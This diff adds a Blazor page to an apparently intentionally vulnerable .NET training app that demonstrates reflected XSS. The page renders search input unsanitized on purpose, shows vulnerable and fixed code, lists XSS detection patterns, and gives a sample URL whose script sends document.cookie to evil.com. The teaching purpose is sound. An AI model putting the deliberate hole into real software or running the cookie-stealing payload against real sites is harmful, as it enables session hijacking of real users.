@@ -1,0 +1,229 @@
+@page "/vulnerabilities/reflected-xss"
+@rendermode InteractiveServer
+@using DotnetSecurityFailures.Services
+@using DotnetSecurityFailures.Models
+@using Microsoft.AspNetCore.Components
+@inject NavigationManager NavigationManager
+@inject VulnerabilityService VulnerabilityService
+
+<PageTitle>Reflected XSS - .NET Security</PageTitle>
+
+<VulnerabilityLayout Slug="reflected-xss" VulnerableCode="@VulnerableCode" SafeCode="@SafeCode">
+    <DemoContent>
+        <h6>Product Search with Reflected XSS:</h6>
+        
+        <div class="input-group mb-3">
+            <input type="text" class="form-control" @bind="searchQuery" 
+                   placeholder="Enter search term" />
+            <button class="btn btn-primary" @onclick="Search">Search</button>
+        </div>
+        <small class="text-muted">Search results will reflect your input unsafely</small>
+
+        @if (!string.IsNullOrEmpty(executedSearch))
+        {
+            <div class="alert alert-info mt-3">
+                <strong>Search Query:</strong>
+                <pre class="mb-0 mt-2 small"><code>@executedSearch</code></pre>
+            </div>
+        }
+
+        @if (!string.IsNullOrEmpty(renderedHtml))
+        {
+            <div class="alert alert-warning mt-3">
+                <strong>Rendered Output (VULNERABLE):</strong>
+                <div class="mt-2 p-2 bg-white border">
+                    @* VULNERABLE - using MarkupString without sanitization *@
+                    @((MarkupString)renderedHtml)
+                </div>
+            </div>
+        }
+
+        @if (!string.IsNullOrEmpty(attackAnalysis))
+        {
+            <div class="alert alert-danger mt-3">
+                <strong>Attack Analysis:</strong>
+                <pre class="mb-0 mt-2" style="white-space: pre-wrap;">@attackAnalysis</pre>
+            </div>
+        }
+
+        <div class="alert alert-dark mt-3">
+            <strong>Try these inputs:</strong>
+            <ul class="mb-0">
+                @foreach (var attack in vulnerability.PredefinedAttacks)
+                {
+                    <li>
+                        <code style="cursor: pointer; color: #0d6efd;" @onclick="() => NavigateToAttack(attack.GetInputAsString())">@attack.Input</code>
+                        @attack.Label
+                    </li>
+                }
+            </ul>
+        </div>
+    </DemoContent>
+
+    <ExplanationContent>
+        <p>Reflected XSS occurs when user input (from URL parameters, form fields, etc.) is immediately reflected back to the page without proper sanitization or encoding. The malicious script executes in the victim's browser with full access to the page.</p>
+        
+        <h6 class="mt-3">How the attack works:</h6>
+        <pre class="bg-light p-2 small"><code>Input: &lt;script&gt;alert('XSS')&lt;/script&gt;
+
+HTML becomes:
+&lt;div&gt;You searched for: &lt;em&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/em&gt;&lt;/div&gt;
+
+Result: Script tag executes JavaScript in victim's browser!</code></pre>
+
+        <h6 class="mt-3">Attack scenario:</h6>
+        <pre class="bg-light p-2 small"><code>1. Attacker crafts URL: 
+   https://site.com/search?q=&lt;script&gt;fetch('evil.com?cookie='+document.cookie)&lt;/script&gt;
+2. Victim clicks the link (via email, social media)
+3. Script executes and steals victim's session cookie
+4. Attacker hijacks victim's session</code></pre>
+        
+        <h6 class="mt-4">Real-world consequences:</h6>
+        <ul>
+            <li><strong>Session hijacking</strong> - steal cookies and authentication tokens</li>
+            <li><strong>Credential theft</strong> - inject fake login forms</li>
+            <li><strong>Keylogging</strong> - capture user keystrokes</li>
+            <li><strong>Defacement</strong> - modify page content</li>
+            <li><strong>Malware distribution</strong> - redirect to malicious sites</li>
+            <li><strong>Phishing attacks</strong> - create convincing fake dialogs</li>
+        </ul>
+    </ExplanationContent>    <PreventionContent>
+        <h5>Protection Against Reflected XSS:</h5>
+        <ol>
+            <li><strong>Don't use MarkupString with user input</strong> - Blazor automatically HTML-encodes by default</li>
+            <li><strong>Avoid Html.Raw()</strong> - in Razor Pages/MVC, use proper encoding</li>
+            <li><strong>Use HtmlEncoder</strong> - explicitly encode when needed: <code>HtmlEncoder.Default.Encode(userInput)</code></li>
+            <li><strong>Content Security Policy (CSP)</strong> - restrict script sources via HTTP headers</li>
+            <li><strong>Use sanitization libraries</strong> - like HtmlSanitizer (Ganss.Xss) for rich text</li>
+        </ol>
+    </PreventionContent>
+</VulnerabilityLayout>
+
+@code {
+    [SupplyParameterFromQuery(Name = "search")]
+    public string? SearchFromUrl { get; set; }
+
+    private Vulnerability? vulnerability;
+    private string searchQuery = "";
+    private string? executedSearch;
+    private string? renderedHtml;
+    private string? attackAnalysis;
+
+    private const string VulnerableCode = """
+// DANGEROUS: Using MarkupString without sanitization
+@page "/search"
+@using Microsoft.AspNetCore.Components
+
+@code {
+    [SupplyParameterFromQuery]
+    public string? Search { get; set; }
+}
+
+<div>
+    You searched for: 
+    @((MarkupString)$"<em>{Search}</em>")
+</div>
+
+// Result: User input rendered as raw HTML!
+// Any script tags will execute!
+""";
+
+    private const string SafeCode = """
+// CORRECT: Let Blazor handle HTML encoding automatically
+@page "/search"
+
+@code {
+    [SupplyParameterFromQuery]
+    public string? Search { get; set; }
+}
+
+<div>
+    You searched for: <em>@Search</em>
+</div>
+
+// Blazor automatically HTML-encodes @Search
+// <script> becomes &lt;script&gt; (safe text)
+
+// For rich text, use sanitization library:
+@using Ganss.Xss
+
+@code {
+    private string SanitizeHtml(string input)
+    {
+        var sanitizer = new HtmlSanitizer();
+        sanitizer.AllowedTags.Clear();
+        sanitizer.AllowedTags.Add("b");
+        sanitizer.AllowedTags.Add("i");
+        sanitizer.AllowedTags.Add("em");
+        return sanitizer.Sanitize(input);
+    }
+}
+""";
+
+    protected override void OnInitialized()
+    {
+        vulnerability = VulnerabilityService.GetBySlug("reflected-xss")
+            ?? throw new InvalidOperationException($"Vulnerability not found: reflected-xss");
+
+        if (!string.IsNullOrEmpty(SearchFromUrl))
+        {
+            searchQuery = SearchFromUrl;
+            Search();
+        }
+    }
+
+    private void Search()
+    {
+        ClearResults();
+
+        if (string.IsNullOrWhiteSpace(searchQuery))
+        {
+            renderedHtml = "Please enter a search term";
+            return;
+        }
+
+        executedSearch = searchQuery;
+        renderedHtml = $"<strong>You searched for:</strong> <em>{searchQuery}</em>";
+
+        var predefinedAttack = vulnerability!.PredefinedAttacks
+            .FirstOrDefault(a => a.Input == searchQuery);
+        
+        if (predefinedAttack != null)
+        {
+            attackAnalysis = predefinedAttack.Description;
+        }
+        else
+        {
+            var xssPatterns = new[] { "<script", "<img", "<svg", "<iframe", "<body", "onerror", "onload", "javascript:" };
+            var containsXss = xssPatterns.Any(p => searchQuery.ToLower().Contains(p));
+            
+            if (containsXss)
+            {
+                attackAnalysis = "POTENTIAL XSS DETECTED!\n\n" +
+                               "The input contains HTML/JavaScript that would execute in the browser.\n\n" +
+                               "IMPACT:\n" +
+                               "- Arbitrary JavaScript execution\n" +
+                               "- Cookie theft possible\n" +
+                               "- Session hijacking\n" +
+                               "- User impersonation";
+            }
+            else
+            {
+                attackAnalysis = "Normal search - no XSS detected.";
+            }
+        }
+    }
+
+    private void ClearResults()
+    {
+        executedSearch = null;
+        renderedHtml = null;
+        attackAnalysis = null;
+    }
+
+    private void NavigateToAttack(string payload)
+    {
+        var encodedPayload = Uri.EscapeDataString(payload);
+        NavigationManager.NavigateTo($"/vulnerabilities/reflected-xss?search={encodedPayload}", forceLoad: true);
+    }
+}
